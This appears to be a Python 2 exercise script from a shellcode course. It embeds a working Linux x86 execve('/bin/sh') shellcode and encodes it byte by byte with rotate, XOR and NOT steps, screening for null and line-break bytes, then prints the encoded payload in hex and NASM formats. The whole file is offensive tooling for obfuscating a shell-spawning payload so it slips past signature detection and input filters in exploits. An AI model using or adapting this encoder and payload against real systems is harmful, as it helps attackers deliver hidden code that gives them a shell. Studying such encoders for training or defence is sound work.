# Title: ROR/XOR/NOT encoder
# File: rorxornotencode.py
# Author: Guillaume Kaddouch
# SLAE-681

#!/usr/bin/python


import sys

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

shellcode = (
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
)

encoded = ""
encoded2 = ""

print "[*] Encoding shellcode..."

for x in bytearray(shellcode):
    # ROR & XOR encoding
    z = ror(x, 7, 8)^0xAA

    # NOT encoding
    y = ~z

    if str('%02x' % (y & 0xff)).upper() == "00":
        print ">>>>>>>>>> NULL detected in shellcode, aborting."
        sys.exit()

    if str('%02x' % (y & 0xff)).upper() == "0A":
        print ">>>>>>>>>>  \\xOA detected in shellcode."

    if str('%02x' % (y & 0xff)).upper() == "0D":
        print ">>>>>>>>>>> \\x0D detected in shellcode."


    encoded += '\\x'
    encoded += '%02x' % (y & 0xff)

    encoded2 += '0x'
    encoded2 += '%02x,' %(y & 0xff)

print "hex version : %s" % encoded
print "nasm version : %s" % encoded2
print "encoded shellcode : %s bytes" % str(len(encoded)/4)
